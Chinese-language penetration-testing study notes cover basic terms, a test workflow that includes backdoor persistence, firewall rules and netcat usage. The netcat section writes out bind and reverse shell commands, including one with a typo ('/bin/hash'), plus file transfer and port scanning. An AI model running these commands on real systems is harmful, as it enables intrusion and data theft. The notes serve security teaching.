# 渗透测试流程与标准与信息收集
---
## 问题集
>渗透的基本概念有哪些？
>如何简单能理解服务器架构？如何使用宝塔建站？
>渗透测试的流程是什么？
>防火墙的基本知识
>nc瑞士军刀的使用
>信息收集收集什么，怎么收集？
## 1. 基本渗透概念
### 核心概念
**POC**
全称'Proof of Concept',中文'概念验证',常指一段漏洞证明的代码
**EXP**
全称'Exploit',中文'利用',指利用漏洞进行攻击的动作
**Payload**
中文'有效荷载',指成功exploit后，真正在目标系统执行的代码或者指令
**Shellcode**
简单翻译'shell代码',是payload的一种，由于其建立正向/反向的shell得名
相关的概念还有很多，更多详细内容请参考[这篇博客](https://www.cnblogs.com/sunny11/p/13583083.html)
## 2. 服务器架构简单理解
**服务器架构的简单理解**
客户端（浏览器\APP\PC应用\...）<-->服务器（JAVA\PHP\Python\\...）<-->数据库（MySQL\Oracle\Excel\\...）
## 3. 渗透测试流程

**明确目标**
1. 根据范围
2. 根据类型

**信息收集**
1. 收集的方式
- 主动扫描
- 开放搜索
2. 类型
- 基本信息收集（ip、网段、域名、端口）
- 操作系统
- 中间件
- 脚本
- 数据库
- CMS源码
- 社工信息（联系信息、人员信息、公司信息、域名/服务器的注册商）

**漏洞验证**
1. 手工验证（主要）
2. 自动化验证
3. 登陆猜解

**信息分析**
1. 绕过防御机制（WAF、防火墙）
2. 定制攻击路线（内网、间接、直接）
3. 绕过检测机制（代码检查）
4. 攻击代码

**获取所需**
1. 获取内部信息
2. 进一步渗透
3. 持续性存在后门

**信息整理与报告**
形成渗透测试报告

## 防火墙的基本知识
1. 入站规则
通过网络访问信息系统时采取的安全措施，通常包括防火墙、入侵检测系统、防病毒系统、访问控制列表（ACL）和其他安全设备。主要目的是防止未经授权的网络流量进入网络，并阻止传播恶意代码、垃圾邮件及其他危害安全的流量。（简单理解就是通过一定规则来控制访问主机的流量）
2. 出站规则
在内部向外部发送数据时采取的安全措施。主要是防止未经授权的网络流量从内部网络出发，以及防止数据泄露。出站规则一般包括访问控制列表、加密、防病毒和其他安全设施（简单理解就是通过一定的规则控制从主机出去的网络流量）
## nc瑞士军刀的使用
1. 简介
NetCat简称nc，在网安界有“瑞士军刀的美称”。可以通过TCP/UDP协议进行读写，是一个好用稳定的连接系统后门的工具，同时也是一个网络调试和开发工具。它的英文介绍或许能让我们有更深刻的理解。（netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP.）
2. 参数
>-l:开启监听
>-p:指定端口
>-t:以telnet形式应答
>-e:程序重定向
>-n:以数字形式标识ip
>-v:显示执行命令的过程
>-z:不进行交互，直接输出结果
>-u:使用UDP协议进行传输
>-w:设置超时时间
>-d:后台执行
3. 基础使用
- 简单聊天
```
//服务端
nc.exe -lp 5566
//客户端
nc.exe 127.0.0.1 5566
```
这就建立了一个简单的聊天窗口，可以通过端口5566进行聊天
- 正向返回shell
```
//服务端
nc.exe -lp 5566 -e cmd.exe
//客户端
nc.exe [服务端ip] 5566
```
- 反弹shell
```
//windows环境下

//服务端
nc.exe -lvp 5566
//客户端
nc.exe -e cmd.exe [服务端ip] 5566
```
``` 
//Linux环境下

//服务端
nc -lvp 5566
//客户端
nc -e /bin/hash [服务端ip] 5566
```
二者都能将shell给到其他电脑并在其他电脑上执行。正向可理解为自己主动把shell从端口传出去，让别人来执行。反弹可理解为开个端口等着别人把shell送上来给自己执行。
- 文件传输
```
//客户端传服务端

//服务端
nc.exe -lp 5566 >outfile.txt
//客户端
nc.exe [服务端ip] 5566 <a.txt
```
```
//服务端传客户端

//服务端
nc.exe -lp 5566 <outfile.txt
//客户端
nc.exe [服务端ip] 5566 >a.txt
```
可以将"<"符号看作喇叭，文件从闭口处传到开口处。或许能更好的分辨他们
- 信息探测
端口扫描（kali执行）
```
nc -n -v -w1 -z [需要扫描的ip] 1-1000
```
打印Banner（kali执行）
```
echo " " |nc -n -v -w1 [扫描的ip] 1-1000
```